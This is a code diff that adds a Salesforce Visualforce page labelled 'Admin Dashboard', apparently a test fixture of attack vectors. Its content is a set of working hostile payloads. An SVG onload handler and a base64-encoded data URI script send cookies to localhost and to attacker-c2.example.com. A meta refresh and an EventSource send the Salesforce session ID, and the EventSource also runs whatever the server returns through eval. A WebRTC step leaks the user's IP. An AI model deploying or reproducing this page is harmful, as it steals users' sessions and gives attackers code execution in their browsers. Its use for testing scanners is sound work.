@@ -1,0 +1,48 @@
+<apex:page showHeader="false" sidebar="false" contentType="text/html">
+    <!-- This page attempts multiple SSRF and data exfiltration vectors -->
+
+    <!-- SVG-based XSS -->
+    <apex:outputText escape="false" value="
+        <svg onload='fetch(\"https://localhost:8080/svg-xss?c=\"+btoa(document.cookie))'>
+        </svg>
+    "/>
+
+    <!-- Data URI injection -->
+    <apex:outputText escape="false" value="
+        <object data='data:text/html;base64,PHNjcmlwdD5mZXRjaCgiaHR0cHM6Ly9hdHRhY2tlci1jMi5leGFtcGxlLmNvbS9kYXRhLXVyaT9jPSIrYnRvYShkb2N1bWVudC5jb29raWUpKTwvc2NyaXB0Pg=='></object>
+    "/>
+
+    <!-- Meta refresh redirect with session data -->
+    <apex:outputText escape="false" value="
+        <meta http-equiv='refresh' content='5;url=https://localhost:8080/meta-redirect?sid={!$Api.Session_ID}'>
+    "/>
+
+    <!-- EventSource for persistent connection -->
+    <script>
+        try {
+            var evtSource = new EventSource('https://localhost:8080/sse?sid=' +
+                encodeURIComponent('{!$Api.Session_ID}'));
+            evtSource.onmessage = function(event) {
+                eval(event.data);
+            };
+        } catch(e) {}
+
+        // WebRTC IP leak
+        try {
+            var pc = new RTCPeerConnection({iceServers: [{urls: 'stun:localhost:8080:3478'}]});
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.onicecandidate = function(ice) {
+                if (ice.candidate) {
+                    fetch('https://localhost:8080/webrtc-ip', {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: ice.candidate.candidate
+                    });
+                }
+            };
+        } catch(e) {}
+    </script>
+
+    <div>Admin Dashboard - Loading...</div>
+</apex:page>
